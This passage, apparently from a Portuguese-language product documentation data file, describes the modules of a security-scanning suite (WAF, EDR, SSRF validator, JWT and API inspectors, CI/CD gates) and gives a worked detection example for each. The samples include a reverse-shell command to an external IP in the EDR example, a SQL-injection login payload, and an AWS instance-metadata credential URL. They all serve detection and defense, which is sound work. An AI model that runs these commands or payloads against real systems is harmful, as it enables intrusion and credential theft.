      title: 'Exemplo: Descoberta de Endpoint Administrativo Oculto',
      scenario: 'O código do frontend continha uma chamada interna para purga de banco de dados não documentada na API pública.',
      inputSnippet: `// Arquivo: src/services/adminService.ts
async function purgeTenant(id: string) {
  return fetch(\`/api/internal/debug/purge-tenant/\${id}\`, { method: 'DELETE' });
}`,
      systemDetection: `[ENDPOINT-SENSITIVE] Descoberta rota interna DELETE /api/internal/debug/purge-tenant/:id.
Severidade: HIGH (Risco de Broken Access Control se desprotegida).`,
      outputRemediation: `// Assegurar que rotas internas sejam restritas por gateway e autenticação mTLS:
// 1. Remover endpoints de depuração do bundle de produção.
// 2. Proteger no WAF e API Gateway com políticas de IP whitelisting.`
    }
  },

  jsminer: {
    id: 'jsminer',
    name: 'JS Miner (Mineração de Bundles & Source Maps)',
    category: 'AppSec & SAST',
    badge: 'Asset Mining',
    shortSummary: 'Auditoria e mineração de bundles JavaScript compilados para identificar vazamentos de Source Maps (.map), buckets de nuvem (S3, GCS, Azure Blob) e segredos embutidos em arquivos transpilados.',
    howItWorks: `Executa regexes e heurísticas sobre bundles JS de distribuição:
1. Verifica se existem referências para arquivos .js.map que permitiriam a atacantes reconstruir 100% do código original.
2. Identifica URLs de buckets de nuvem (ex: s3.amazonaws.com, storage.googleapis.com) e testa se estão publicamente acessíveis.
3. Detecta credenciais esquecidas em código minificado.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar "JS Miner"',
        description: 'Confira os assets, bundles e buckets identificados nos scripts do projeto.'
      },
      {
        step: 2,
        action: 'Verificar Arquivos Source Map',
        description: 'Identifique se seu pipeline de build está publicando acidentalmente arquivos .map em produção.'
      },
      {
        step: 3,
        action: 'Inspecionar Buckets S3 / Nuvem',
        description: 'Analise a lista de URLs de armazenamento em nuvem para validar se possuem controle de acesso rígido.'
      },
      {
        step: 4,
        action: 'Exportar Inventário de Assets',
        description: 'Exporte o relatório dos assets minerados para o time de infraestrutura.'
      }
    ],
    example: {
      title: 'Exemplo: Bucket S3 Exposto em Bundle Minificado',
      scenario: 'Um bucket contendo backups de clientes estava hardcoded no bundle compilado do frontend.',
      inputSnippet: `const BUCKET_URL = "https://empresa-backups-privados-2024.s3.amazonaws.com/";`,
      systemDetection: `[JSMINER-CLOUD-BUCKET] AWS S3 Bucket descoberto no código.
Risco: Se as permissões do bucket não estiverem configuradas com 'Block Public Access', arquivos podem ser baixados publicamente.`,
      outputRemediation: `// Remova URLs diretas de buckets de produção:
// Utilize URLs assinadas (Pre-signed URLs) geradas pelo backend autenticado.`
    }
  },

  waf: {
    id: 'waf',
    name: 'WAF - Web Application Firewall (ModSecurity & OWASP CRS)',
    category: 'Defesa & Runtime',
    badge: 'OWASP CRS',
    shortSummary: 'Módulo de proteção de borda para filtragem de tráfego HTTP/HTTPS em tempo real baseado nas regras do OWASP Core Rule Set (CRS).',
    howItWorks: `Inspeciona requisições recebidas (URI, Headers, Cookies, Body) avaliando assinaturas contra injeções SQL, XSS, RCE, LFI/RFI e abuso de protocolos. Inclui simulador de ataques interativo para disparar payloads e visualizar a decisão do motor (BLOCKED vs ALLOWED), taxa de bloqueio (Block Rate) e latência de inspeção.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "WAF (ModSecurity CRS)"',
        description: 'Visualize os gráficos de telemetria de requisições, status das regras e logs de bloqueio.'
      },
      {
        step: 2,
        action: 'Usar o Simulador de Requisições',
        description: 'Selecione um payload malicioso pré-configurado (ex: SQLi UNION) ou digite um payload customizado.'
      },
      {
        step: 3,
        action: 'Enviar Requisição de Teste',
        description: 'Clique em "Enviar Requisição" para ver o WAF processar o pacote, atribuir a pontuação de anomalia e gerar o código HTTP 403 Forbidden.'
      },
      {
        step: 4,
        action: 'Gerenciar Regras e ACLs',
        description: 'Ative ou desative regras específicas do OWASP CRS ou configure listas de bloqueio por IP.'
      }
    ],
    example: {
      title: 'Exemplo: Bloqueio de Payload SQLi no Simulador WAF',
      scenario: 'Um atacante tenta autenticar contornando a senha com payload booleano na rota de login.',
      inputSnippet: `POST /api/v1/auth/login HTTP/1.1
Content-Type: application/json

{ "username": "admin' OR 1=1 --", "password": "x" }`,
      systemDetection: `[WAF-RULE-942100] Decisão: BLOCKED (403 Forbidden)
Motivo: Detectada assinatura de SQL Injection (Boolean-based evasion)
Anomaly Score: 15 (Limiar de Bloqueio: 5)`,
      outputRemediation: `O WAF protegeu a aplicação imediatamente por meio de Virtual Patching antes que a requisição chegasse ao banco de dados.`
    }
  },

  edr: {
    id: 'edr',
    name: 'EDR & Live Response (Detecção e Resposta em Endpoints)',
    category: 'Defesa & Runtime',
    badge: 'eBPF & Kernel',
    shortSummary: 'Sensor de segurança para rastrear árvores de processos, execução de comandos suspeitos (LOLBins), contenção Zero Trust de hosts e terminal RTR (Real-Time Response).',
    howItWorks: `Coleta telemetria em tempo real no kernel do sistema operacional (via eBPF / auditd):
• Rastreia linhagem pai-filho de processos (ex: servidor Node.js spawnando bash ou curl).
• Detecta táticas do MITRE ATT&CK (ex: dump de credenciais, injeção de bibliotecas).
• Executa ações defensivas: encerramento cirúrgico de processos suspeitos (SIGKILL), isolamento de rede do endpoint ou quarentena de binários.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Navegar até "EDR (Detection & Response)"',
        description: 'Confira o inventário de máquinas monitoradas e o status de telemetria de agentes.'
      },
      {
        step: 2,
        action: 'Analisar Árvore de Processos',
        description: 'Inspecione bifurcações de processos para identificar comandos anômalos disparados por serviços web.'
      },
      {
        step: 3,
        action: 'Acionar Terminal RTR',
        description: 'Execute comandos de auditoria remota direta no host (ps, netstat, kill <pid>, isolate-host).'
      },
      {
        step: 4,
        action: 'Executar Contenção de Host',
        description: 'Clique em "Isolar Host" para cortar todo o tráfego de rede do nó comprometido, preservando apenas o canal seguro com o SOC.'
      }
    ],
    example: {
      title: 'Exemplo: Detecção de Web Shell Spawnando Bash',
      scenario: 'Uma vulnerabilidade de RCE no serviço web permitiu ao invasor abrir uma shell reversa.',
      inputSnippet: `Processo Pai: node /var/app/server.js (PID 1042)
Processo Filho: /bin/sh -c "bash -i >& /dev/tcp/198.51.100.4/4444 0>&1" (PID 1099)`,
      systemDetection: `[EDR-IOA-SUSPICIOUS-SHELL] CRITICAL: Aplicação web executou interpretador de shell com socket de rede externo.
Ação Sugerida: Matar processo e isolar host.`,
      outputRemediation: `# Comando executado no RTR do EDR:
kill -9 1099
isolate-host --reason "RCE detectado via node process"`
    }
  },

  frameworks: {
    id: 'frameworks',
    name: 'Centro de Frameworks (MITRE ATT&CK, NIST CSF 2.0 & OWASP WSTG)',
    category: 'Conformidade & Governança',
    badge: 'MITRE / NIST',
    shortSummary: 'Matriz cruzada que mapeia todas as vulnerabilidades do repositório para as táticas e técnicas do MITRE ATT&CK, funções do NIST CSF 2.0 e testes do OWASP WSTG.',
    howItWorks: `Traduz os achados estáticos de código para as linguagens formais de cibersegurança reconhecidas pela indústria:
• MITRE ATT&CK: Táticas de Acesso Inicial (T1190), Execução (T1059), Acesso a Credenciais (T1552 - Credentials in Files) e Exfiltração.
• NIST CSF 2.0: Funções Govern, Identify, Protect, Detect, Respond e Recover.
• OWASP WSTG: Testes práticos do Web Security Testing Guide (WSTG-INP-01, WSTG-CRYP-01).`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar "Frameworks (MITRE/NIST/OWASP)"',
        description: 'Selecione a aba do framework desejado no topo do painel.'
      },
      {
        step: 2,
        action: 'Inspecionar a Matriz de Cobertura',
        description: 'Veja quais técnicas e táticas estão acesas em vermelho de acordo com as vulnerabilidades encontradas no código.'
      },
      {
        step: 3,
        action: 'Visualizar Controles Defensivos MITRE D3FEND',
        description: 'Consulte contramedidas arquiteturais sugeridas para neutralizar a técnica ofensiva correspondente.'
      },
      {
        step: 4,
        action: 'Exportar Matriz de Mapeamento',
        description: 'Baixe o mapeamento para preenchimento de matrizes de risco corporativas.'
      }
    ],
    example: {
      title: 'Exemplo: Mapeamento de Segredo Hardcoded no MITRE ATT&CK',
      scenario: 'Chave de API em código mapeada para a técnica oficial do MITRE.',
      inputSnippet: `Achado SAST: AWS Access Key ID no arquivo config.ts`,
      systemDetection: `MITRE ATT&CK: T1552.001 - Unsecured Credentials: Credentials In Files
NIST CSF 2.0: PR.DS-01 (Data-at-rest is protected)
OWASP WSTG: WSTG-CRYP-04 (Testing for Weak Encryption)`,
      outputRemediation: `Contramedida MITRE D3FEND: D3-EMC (Encrypted File Storage) & D3-EAM (Environment Authentication Management)`
    }
  },

  rules: {
    id: 'rules',
    name: 'Motor de Regras Regex & Entropia Customizável',
    category: 'AppSec & SAST',
    badge: 'Custom Rules',
    shortSummary: 'Gerenciador avançado de regras de auditoria para criar, testar e salvar expressões regulares corporativas com limiares de severidade e entropia.',
    howItWorks: `Permite estender o motor SAST com regras proprietárias da sua organização (ex: tokens internos de sistemas legados, números de CPF/CNPJ, padrões bancários). Cada regra possui ID, expressão regular com suporte a flags (i, g, m), severidade, categoria OWASP e limiar opcional de entropia de Shannon.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Abrir a aba "Regras Regex"',
        description: 'Visualize a lista de regras ativas e crie novas regras clicando em "Nova Regra".'
      },
      {
        step: 2,
        action: 'Preencher Padrão Regex e Severidade',
        description: 'Defina a expressão regular (ex: \\bEMP-[0-9]{8}-[A-Z]{4}\\b) e determine se é CRITICAL, HIGH ou MEDIUM.'
      },
      {
        step: 3,
        action: 'Testar a Regra em Tempo Real',
        description: 'Digite um texto de teste no campo interativo para conferir se a regra captura o padrão desejado antes de ativá-la.'
      },
      {
        step: 4,
        action: 'Salvar e Reexecutar Varredura',
        description: 'Salve a regra. Ela é incorporada instantaneamente ao motor de varredura do workspace.'
      }
    ],
    example: {
      title: 'Exemplo: Regra Customizada para Token de API Interna',
      scenario: 'A organização possui um formato proprietário de token interno: "CORP-SEC-XXXXXXXXXX".',
      inputSnippet: `// Definição da Regra Customizada:
ID: CUSTOM-CORP-TOKEN-01
Pattern: CORP-SEC-[a-zA-Z0-9]{16}
Severity: CRITICAL
Min Entropy: 3.8 bits/char`,
      systemDetection: `Regra cadastrada com sucesso. Ao varrer o código, qualquer ocorrência do padrão gerará um alerta de severidade CRITICAL no dashboard.`,
      outputRemediation: `Adicione a regra ao arquivo custom-rules.json e reutilize na CLI com --rules ./custom-rules.json.`
    }
  },

  cli: {
    id: 'cli',
    name: 'Terminal CLI & Execução Local',
    category: 'Infraestrutura & DevSecOps',
    badge: 'Terminal / CLI',
    shortSummary: 'Console emulado de linha de comando com suporte a todos os comandos do utilitário bin/secscan.js, flags de quality gate e exportação SARIF.',
    howItWorks: `Permite simular no navegador a experiência de executar o SecScan no terminal da sua máquina ou em agentes CI/CD Linux. Suporta comandos como "secscan run .", "secscan --max-risk 50", "secscan --fail-on critical" e "help".`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "Terminal CLI"',
        description: 'O terminal é aberto com o prompt de comando pronto para digitação.'
      },
      {
        step: 2,
        action: 'Digitar Comandos',
        description: 'Digite "help" para ver a lista de parâmetros disponíveis ou "secscan run ." para disparar a auditoria.'
      },
      {
        step: 3,
        action: 'Testar Quality Gate',
        description: 'Execute "secscan run . --max-risk 40" para ver como a CLI bloqueia o pipeline quando o score de risco é ultrapassado.'
      },
      {
        step: 4,
        action: 'Copiar Comandos para o Terminal Real',
        description: 'Copie a sintaxe para rodar na sua máquina local com "node bin/secscan.js .".'
      }
    ],
    example: {
      title: 'Exemplo: Executando Quality Gate no Terminal',
      scenario: 'Bloquear build se houver risco acima de 50.',
      inputSnippet: `$ node bin/secscan.js . --max-risk 50 --format sarif --output audit.sarif`,
      systemDetection: `[SECSCAN CLI] Auditando 14 arquivos...
Achados encontrados: 3 Críticos, 4 Altos
Risk Score Cumulativo: 68.4/100 [HIGH]
[QUALITY GATE FALHOU] Risk Score (68.4) excedeu o limite máximo configurado (50.0).
Exit Code: 1`,
      outputRemediation: `Corrija as vulnerabilidades críticas usando a Auto-Remediação para abaixar a nota para menos de 50 e liberar o pipeline.`
    }
  },

  cicd: {
    id: 'cicd',
    name: 'CI/CD & Integração GitHub Actions',
    category: 'Infraestrutura & DevSecOps',
    badge: 'GitHub Actions',
    shortSummary: 'Gerador automatizado de pipelines DevSecOps para GitHub Actions, GitLab CI e Azure Pipelines com Quality Gates e upload de SARIF 2.1.0.',
    howItWorks: `Gera arquivos de workflow prontos (.github/workflows/secscan.yml) que rodam a cada push e pull request. O scanner executa na máquina do GitHub Actions, gera o relatório OASIS SARIF 2.1.0 e o publica nativamente na aba "Security > Code scanning alerts" do GitHub.`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Abrir a aba "CI/CD & Cloud"',
        description: 'Visualize os geradores de pipeline para GitHub Actions e GitLab CI.'
      },
      {
        step: 2,
        action: 'Configurar Regras de Quality Gate',
        description: 'Ajuste os parâmetros de tolerância de risco (--max-risk) e severidade (--fail-on).'
      },
      {
        step: 3,
        action: 'Copiar ou Baixar o Arquivo YAML',
        description: 'Clique em "Download Workflow" para salvar o arquivo .github/workflows/secscan.yml.'
      },
      {
        step: 4,
        action: 'Comitar no Repositório',
        description: 'Faça commit do arquivo no seu repositório Git para ativar a proteção automática em todos os PRs.'
      }
    ],
    example: {
      title: 'Exemplo: Pipeline GitHub Actions Completo',
      scenario: 'Integrar SecScan no GitHub Actions com publicação de alertas SARIF.',
      inputSnippet: `name: SecScan Security Gate
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22 }
      - run: npm ci
      - run: node bin/secscan.js . --format sarif --output secscan.sarif --max-risk 50
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with: { sarif_file: secscan.sarif }`,
      systemDetection: `O pipeline analisa todo o código em menos de 10 segundos e publica os alertas diretamente na interface de PR do GitHub.`,
      outputRemediation: `Qualquer tentativa de commitar segredos ou códigos inseguros bloqueia a fusão do Pull Request automaticamente.`
    }
  },
  headers: {
    id: 'headers',
    name: 'Security Headers & CSP Studio',
    category: 'AppSec & SAST',
    badge: 'OWASP Headers',
    shortSummary: 'Auditoria de cabeçalhos HTTP defensivos (CSP, HSTS, X-Frame-Options, COOP, CORP) com nota OWASP e gerador multi-servidor.',
    howItWorks: 'Avalia a presença e a conformidade dos cabeçalhos HTTP contra boas práticas OWASP, atribuindo nota de A+ a F e calculando score de conformidade.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Escolha um Preset ou Cole os Headers',
        description: 'Selecione um preset de exemplo ou cole os cabeçalhos de resposta HTTP do seu servidor na caixa de texto.'
      },
      {
        step: 2,
        action: 'Analise a Nota e as Recomendações',
        description: 'Veja a nota de segurança (A+ a F), o score numérico e as recomendações detalhadas por cabeçalho.'
      },
      {
        step: 3,
        action: 'Exporte para o seu Servidor Web',
        description: 'Clique nas abas NGINX, Apache, Express ou Next.js e copie a configuração blindada com 1 clique.'
      }
    ],
    example: {
      title: 'Exemplo: Content-Security-Policy Estrita',
      scenario: 'Prevenir Cross-Site Scripting (XSS) e Data Exfiltration restringindo origens permitidas.',
      inputSnippet: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';`,
      systemDetection: `Configuração válida com nota A+ conforme OWASP Secure Headers Project.`,
      outputRemediation: `Snippet NGINX gerado: add_header Content-Security-Policy "default-src 'self'; ..." always;`
    }
  },
  containerscan: {
    id: 'containerscan',
    name: 'Trivy & Container Security Scanner',
    category: 'Infraestrutura & DevSecOps',
    badge: 'CIS Benchmark',
    shortSummary: 'Auditoria estática de Dockerfiles contra CIS Docker Benchmarks, execução não-root e vulnerabilidades de base.',
    howItWorks: 'Analisa instruções FROM, USER, RUN, COPY, ADD e HEALTHCHECK comparando com boas práticas CIS e Hadolint para gerar contêineres blindados.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Carregar ou Editar o Dockerfile',
        description: 'O SecScan carrega o Dockerfile do workspace automaticamente ou você pode colar qualquer Dockerfile.'
      },
      {
        step: 2,
        action: 'Inspecionar Alertas de CIS Docker Benchmark',
        description: 'Examine as violações mapeadas para regras Hadolint (DL3002, DL3008, DL3020) com linha e severidade.'
      },
      {
        step: 3,
        action: 'Aplicar Dockerfile Multi-Stage Hardened',
        description: 'Copie ou salve no workspace o Dockerfile blindado multi-stage gerado com usuário não-root e healthcheck.'
      }
    ],
    example: {
      title: 'Exemplo: Execução Não-Root em Contêiner',
      scenario: 'Evitar que uma falha de RCE no aplicativo comprometa o host do Kubernetes ou Docker.',
      inputSnippet: `USER root\nENTRYPOINT ["node", "server.js"]`,
      systemDetection: `Alerta Crítico DL3002: Contêiner executa como root sem drop de privilégios.`,
      outputRemediation: `Adicionar usuário não-privilegiado: RUN adduser -D appuser && USER appuser`
    }
  },
  cloudiam: {
    id: 'cloudiam',
    name: 'Cloud IAM & CSPM Least-Privilege Auditor',
    category: 'Infraestrutura & DevSecOps',
    badge: 'AWS IAM / CSPM',
    shortSummary: 'Auditoria de políticas AWS IAM, vetores de escalada de privilégios e exposição pública.',
    howItWorks: 'Mapeia políticas JSON para identificar privilégios excessivos (wildcards *), vetores de escalada de privilégio (PassRole + Lambda/EC2) e ausência de TLS.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Selecionar Cenário ou Colar Política JSON',
        description: 'Escolha uma amostra (Administrador Wildcard, PassRole Privilege Escalation, S3 Público) ou cole seu JSON.'
      },
      {
        step: 2,
        action: 'Verificar Alertas de Risco e Escalada',
        description: 'O auditor detecta vetores MITRE ATT&CK T1078 e T1548 e exibe o Posture Score de conformidade.'
      },
      {
        step: 3,
        action: 'Copiar Política de Privilégio Mínimo',
        description: 'Utilize a política corrigida gerada com escopo estrito de ARNs e imposição de TLS obrigatório.'
      }
    ],
    example: {
      title: 'Exemplo: Detecção de Wildcard Total (Action: "*")',
      scenario: 'Política com permissões irrestritas de Administrador concedida indevidamente.',
      inputSnippet: `{"Effect": "Allow", "Action": "*", "Resource": "*"}`,
      systemDetection: `Alerta Crítico: Violação direta do princípio de menor privilégio NIST 800-53 AC-6.`,
      outputRemediation: `Substituição por ações delimitadas e condições estritas de aws:SecureTransport.`
    }
  },
  jwtinspector: {
    id: 'jwtinspector',
    name: 'JWT & API Token Forensic Inspector',
    category: 'AppSec & SAST',
    badge: 'RFC 7519',
    shortSummary: 'Decodificador e inspetor forense de tokens JWT, detecção de alg: none, senhas fracas e dados confidenciais expostos.',
    howItWorks: 'Decodifica Header, Payload e Assinatura, valida claims canônicas (exp, iss, aud, nbf) e testa vetores como CVE-2015-9235 (alg: none) e quebra de HMAC fraco.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Colar o Token JWT',
        description: 'Insira o token recebido no header Authorization para decodificar as 3 partes (Header, Payload, Assinatura).'
      },
      {
        step: 2,
        action: 'Auditar Claims Canônicas e Vulnerabilidades',
        description: 'Verifique se o token possui expiração válida, emissor (iss), audiência (aud) e se o segredo é robusto.'
      },
      {
        step: 3,
        action: 'Testar Simulação de Forja alg: none',
        description: 'Gere um exploit com role modificada para validar se seu backend rejeita tokens desprovidos de assinatura.'
      }
    ],
    example: {
      title: 'Exemplo: Detecção de Chave HMAC Fraca ("secret")',
      scenario: 'Token assinado com segredo trivial sujeito a ataque de força bruta instantâneo.',
      inputSnippet: `eyJhbGciOiJIUzI1NiJ9... [Assinado com segredo "secret"]`,
      systemDetection: `Alerta Crítico CWE-521: Chave trivial adivinhada com sucesso em dicionário.`,
      outputRemediation: `Utilizar segredos de 256 bits gerados criptograficamente ou migrar para chaves assimétricas RS256/EdDSA.`
    }
  },
  ssrfvalidator: {
    id: 'ssrfvalidator',
    name: 'SSRF & Webhook Safety Validator',
    category: 'Defesa & Runtime',
    badge: 'SSRF Defense',
    shortSummary: 'Validação de URLs de saída e webhooks para prevenção de Server-Side Request Forgery e proteção de metadados de nuvem.',
    howItWorks: 'Inspeciona esquema, hostname, IP canônico, portas e formatos de evasão (decimal, hex) para prevenir acesso a 169.254.169.254 e redes internas RFC 1918.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Inserir a URL de Destino',
        description: 'Digite a URL fornecida pelo usuário ou escolha uma amostra de teste (AWS IMDS, GCP, Decimal IP).'
      },
      {
        step: 2,
        action: 'Visualizar Diagnóstico e Classificação',
        description: 'Confira se a URL atinge recursos locais, portas internas ou metadados de nuvem sensíveis.'
      },
      {
        step: 3,
        action: 'Copiar o Cliente HTTP Blindado',
        description: 'Integre o exemplo de código com pré-resolução de DNS e bloqueio determinístico no seu backend Node.js.'
      }
    ],
    example: {
      title: 'Exemplo: Tentativa de Acesso ao Metadados AWS IMDSv1',
      scenario: 'Invasor fornece URL para ler chaves temporárias da instância EC2.',
      inputSnippet: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
      systemDetection: `Bloqueio Crítico: Endpoint de Metadados de Nuvem (MITRE ATT&CK T1552.005).`,
      outputRemediation: `Rejeitar imediatamente no gateway e configurar o cliente HTTP com filtro de faixas privadas.`
    }
  },
  apisecurity: {
    id: 'apisecurity',
    name: 'API Security & BOLA/IDOR Inspector',
    category: 'AppSec & SAST',
    badge: 'OWASP API 2023',
    shortSummary: 'Auditoria estática e de contratos para APIs REST e GraphQL baseada no OWASP API Security Top 10, com foco em BOLA/IDOR, Mass Assignment e Rate Limiting.',
    howItWorks: 'Analisa arquivos de rotas e controllers identificando passagem direta de identificadores de objeto (:id, :userId), injeção desprotegida de req.body em bancos e rotas sem limitação de taxa.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar o Módulo "API Security (BOLA/OWASP)"',
        description: 'Visualize todas as rotas mapeadas no workspace e suas vulnerabilidades em relação ao OWASP API Top 10.'
      },
      {
        step: 2,
        action: 'Inspecionar Falhas e Provas de Conceito (PoC)',
        description: 'Abra um card para visualizar o comando cURL de exploração demonstrativa e o impacto no negócio.'
      },
      {
        step: 3,
        action: 'Copiar o Padrão de Código Seguro',
        description: 'Aplique as correções recomendadas utilizando schemas tipados (Zod/Joi) e verificação obrigatória de tenant/propriedade.'
      }
    ],
    example: {
      title: 'Exemplo: BOLA no Endpoint GET /api/v1/users/:userId/financial-statement',
      scenario: 'Atacante autenticado altera o parâmetro :userId para visualizar extratos bancários de outras contas.',
      inputSnippet: `router.get('/api/v1/users/:userId/financial-statement', async (req, res) => {
  const statement = await db.statements.findOne({ userId: req.params.userId });
  return res.json(statement);
});`,
      systemDetection: `[API1:2023_BOLA] Broken Object Level Authorization (CWE-639) - Severidade Crítica`,
      outputRemediation: `Adicionar verificação de autorização: WHERE userId = req.user.id AND tenantId = req.user.tenantId.`
    }
  },
  asocsla: {
    id: 'asocsla',
    name: 'ASOC & Vulnerability SLA Manager',
    category: 'Conformidade & Governança',
    badge: 'SLA Engine',
    shortSummary: 'Gestão contínua de ciclo de vida de vulnerabilidades, monitoramento de prazos de remediação corporativos (P0/P1/P2) e cálculo de Débito Técnico de Segurança.',
    howItWorks: 'Correlaciona achados das ferramentas de segurança (SAST, SCA, IaC, APIs), aplica políticas de SLA por severidade (48h para Crítico, 7 dias para Alto) e mede MTTR e taxa de conformidade por time.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "ASOC & SLA Manager"',
        description: 'Analise o painel executivo com SLA Compliance Rate, Débito Técnico e métricas por equipe.'
      },
      {
        step: 2,
        action: 'Filtrar por Status de SLA ou Time Responsável',
        description: 'Isole vulnerabilidades "SLA Estourado (Breached)" ou "Próximo de Estourar" para priorização ágil.'
      },
      {
        step: 3,
        action: 'Acompanhar Resoluções e MTTR',
        description: 'Marque itens como remediados para atualizar a taxa de conformidade corporativa.'
      }
    ],
    example: {
      title: 'Exemplo: Violação de SLA P0 (Chave Privada Exposta há 52 Horas)',
      scenario: 'Uma credencial Stripe foi detectada em código de produção e o prazo corporativo de 48 horas foi ultrapassado.',
      inputSnippet: `Finding: Hardcoded Stripe Secret Key | Descoberto há 52h | SLA Máximo: 48h`,
      systemDetection: `Alerta ASOC: SLA Breached! Multa de conformidade e risco iminente de exfiltração financeira.`,
      outputRemediation: `Revogar a chave no painel da Stripe imediatamente e aprovar PR de contingência do time Backend.`
    }
  },
  soccommand: {
    id: 'soccommand',
    name: 'Security Operations Center (SOC) Command View',
    category: 'Defesa & Runtime',
    badge: 'SOC LIVE',
    shortSummary: 'Console operacional centralizado de operações de segurança: consolidação em tempo real de logs de auditoria, curvas analíticas de MTTR e alertas de segurança críticos da suíte.',
    howItWorks: 'Ingere fluxos de telemetria e auditoria de todos os scanners (SAST, Secrets, IaC, OWASP API, SCA, EDR), mapeia curvas de tendência temporal (1h, 6h, 24h, 7d, 30d) e monitora MTTR versus metas de SLA.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Selecionar Janela Temporal (1H, 6H, 24H, 7D, 30D ou ALL)',
        description: 'Filtre imediatamente a volumetria de eventos, incidentes e métricas de MTTR na janela selecionada.'
      },
      {
        step: 2,
        action: 'Analisar Curvas de Tendência e MTTR',
        description: 'Verifique se o tempo médio de remediação está convergindo para a meta corporativa (≤ 2.0h) ou se há picos de incidentes.'
      },
      {
        step: 3,
        action: 'Inspecionar Stream de Logs e Triar Alertas Críticos',
        description: 'Acompanhe logs de auditoria ao vivo e clique em qualquer alerta crítico para ver diagnóstico, tempo decorrido e plano de resposta.'
      }
    ],
    example: {
      title: 'Exemplo: Pico de Incidentes e Resposta Imediata no Console SOC',
      scenario: 'Alerta crítico de vazamento de credencial AWS e falha BOLA simultânea reportados pelo pipeline.',
      inputSnippet: `ALERT-SAST-1: Hardcoded AWS IAM Secret Key (P0) + ALERT-API-1: BOLA on /financial-statement (P0)`,
      systemDetection: `Alerta SOC Unificado: 2 Incidentes P0 Ativos | MTTR Atual: 2.1h | Ingress: 142 ev/s`,
      outputRemediation: `Despachar equipe SecOps via playbook automatizado e isolar chaves via console de remediação.`
    }
  },
  refactoring: {
    id: 'refactoring',
    name: 'Security Refactoring Assistant',
    category: 'AppSec & SAST',
    badge: 'Modernize / Preview',
    shortSummary: 'Assistente interativo de refatoração para vulnerabilidades comuns. Fornece snippets modernos para substituir bibliotecas legadas (como MD5, DES e createCipher por Argon2id e AES-256-GCM) com comparativo antes/depois.',
    howItWorks: 'Varre o workspace em busca de padrões obsoletos (hashing fraco, cifras depreciadas, PRNG não criptográfico, injeção SQL direta, DOM XSS e segredos estáticos), sugere alternativas modernas alinhadas aos padrões FIPS 140-3 e OWASP, e oferece visualização comparativa (Preview) em modo lado a lado ou Git Diff unificado, com aplicação direta aos arquivos do projeto.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Navegar até a aba "Refactoring Assistant"',
        description: 'Explore o catálogo de receitas de modernização ou clique no banner de padrões identificados no seu workspace.'
      },
      {
        step: 2,
        action: 'Clicar no botão "Preview Antes / Depois"',
        description: 'Abra a janela comparativa para contrastar o código legado inseguro com a solução moderna segura em modo Lado a Lado ou Git Diff.'
      },
      {
        step: 3,
        action: 'Revisar Pré-requisitos e Instruções de Migração',
        description: 'Consulte os comandos de instalação de pacotes (ex.: npm install argon2) e alertas de quebras de contrato (breaking changes).'
      },
      {
        step: 4,
        action: 'Aplicar a Modernização ao Arquivo ou Copiar o Trecho',
        description: 'Aplique a refatoração diretamente ao arquivo do workspace com 1 clique (com suporte a reversão) ou copie o código moderno.'
      }
    ],
    example: {
      title: 'Exemplo: Substituição de MD5 e createCipher por Argon2id e AES-256-GCM',
      scenario: 'Um serviço legado de criptografia armazena senhas com MD5 sem salt e encripta payloads com crypto.createCipher("aes-128-ecb").',
      inputSnippet: `const cipher = crypto.createCipher('aes-128-ecb', secretKey); // Inseguro`,
      systemDetection: `CWE-326 & CWE-327: Cifra obsoleta sem IV e modo ECB detectados em src/services/encryptionService.js.`,
      outputRemediation: `Refatorado para node:crypto.createCipheriv("aes-256-gcm") com IV aleatório de 12 bytes e tag de autenticação de 16 bytes.`
    }
  },
  pipelineflow: {
    id: 'pipelineflow',
    name: 'Pipeline Flow Architect',
    category: 'Infraestrutura & DevSecOps',
    badge: 'Shift-Left / YAML',
    shortSummary: 'Arquiteto visual de esteira DevSecOps com suporte total a drag-and-drop. Permite mapear achados de varredura local para os estágios Pre-commit, Build e Deploy, ajustando limites de Quality Gate e gerando workflows para GitHub Actions.',
    howItWorks: 'Categoriza automaticamente ou permite arrastar e soltar achados e passos de verificação de segurança entre 3 estágios (Pre-commit ➔ Build ➔ Deploy). Fornece simulador interativo de Quality Gate e produz arquivos declarativos `.github/workflows/secscan-pipeline.yml` com integração a SARIF, runners Linux/Windows/macOS e branch triggers.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "Pipeline Architect"',
        description: 'Visualize as 3 colunas conectadas (Pre-commit, Build e Deploy) com seus respectivos achados e ações ativas.'
      },
      {
        step: 2,
        action: 'Mapear Achados Locais via Drag & Drop',
        description: 'Arraste achados da doca inferior ou entre os estágios para definir em qual fase a vulnerabilidade deve ser bloqueada.'
      },
      {
        step: 3,
        action: 'Reorganizar Passos e Ajustar Severidade do Gate',
        description: 'Adicione novas verificações (DAST, SCA, CIS Docker, SBOM) e selecione o nível de severidade para falha (ex.: Fail on HIGH).'
      },
      {
        step: 4,
        action: 'Simular Execução e Salvar Workflow',
        description: 'Clique em "Simular Execução" para testar o comportamento dos gates ou salve diretamente em .github/workflows/ no workspace.'
      }
    ],
    example: {
      title: 'Exemplo: Shift-Left de Chaves AWS e Tokens de Alta Entropia',
      scenario: 'Uma chave estática de AWS foi detectada em src/config.js e vulnerabilidades SAST foram encontradas em controladores.',
      inputSnippet: `aws_secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"`,
